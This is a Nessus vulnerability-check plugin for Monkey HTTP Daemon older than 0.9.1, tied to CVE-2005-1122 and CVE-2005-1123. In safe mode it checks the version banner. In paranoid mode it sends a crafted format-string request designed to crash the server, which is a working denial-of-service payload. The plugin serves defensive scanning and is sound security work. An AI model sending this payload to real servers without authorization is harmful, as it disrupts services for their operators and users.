#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description) {
  script_id(18059);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2005-1122", "CVE-2005-1123");
  script_bugtraq_id(13187, 13188);
  script_xref(name:"OSVDB", value:"15511");
  script_xref(name:"OSVDB", value:"15512");
  script_xref(name:"GLSA", value:"200504-14");

  script_name(english:"Monkey HTTP Daemon (monkeyd) < 0.9.1 Multiple Vulnerabilities");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The version of the Monkey HTTP Server installed on the remote host
suffers from the following flaws :

  - A Format String Vulnerability
    A remote attacker may be able to execute arbitrary code with the
    permissions of the user running monkeyd by sending a specially-
    crafted request.

  - A Denial of Service Vulnerability
    Repeatedly requesting a zero-byte length file, if one exists, 
    could cause the web server to crash." );
 script_set_attribute(attribute:"see_also", value:"http://bugs.gentoo.org/show_bug.cgi?id=87916" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to monkeyd 0.9.1 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );

script_end_attributes();

  script_summary(english:"Checks for multiple vulnerabilities in Monkey HTTP Daemon < 0.9.1");
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"CGI abuses");
  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80, 2001);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");

port = get_http_port(default:2001);
if (!get_port_state(port)) port = 80;
if (!get_port_state(port) || get_kb_item("Services/www/" + port + "/broken") ) exit(0);


# Make sure it's Monkey.
banner = get_http_banner(port:port);
if (
  !banner || 
  !egrep(pattern:"^Server:.*Monkey/", string:banner)
) exit(0);


# If safe chceks are enabled, check the version number.
if (safe_checks()) {
  if (egrep(string:banner, pattern:"^Server: +Monkey/0\.([0-8]|9\.[01][^0-9])")) {
    report = string(
      "\n",
      "Nessus has determined the vulnerability exists on the remote host\n",
      "simply by looking at the version number of Monkey HTTP Daemon\n",
      "installed there.\n"
    );
    security_hole(port:port, extra:report);
  }
}
# Otherwise, try to crash it.
#
# nb: this *should* just crash the child processing the request, 
#     not the parent itself.
else if (report_paranoia == 2) {

  # Make sure it's up first.
  soc = http_open_socket(port);
  if (!soc) exit(0);
  req = string("GET / HTTP/1.1\nHost: ", get_host_name(), "\n\n");
  send(socket:soc, data:req);
  res = http_recv(socket:soc);
  http_close_socket(soc);
  if (res == NULL) exit(0);

  # And now, exploit it.
  soc = http_open_socket(port);
  if (!soc) exit(0);
  req = "GET %%00 HTTP/1.1\nHost: %%500n%%500n\n\n";
  send(socket:soc, data:req);
  res = http_recv(socket:soc);
  http_close_socket(soc);
  if (!res) security_hole(port);
}
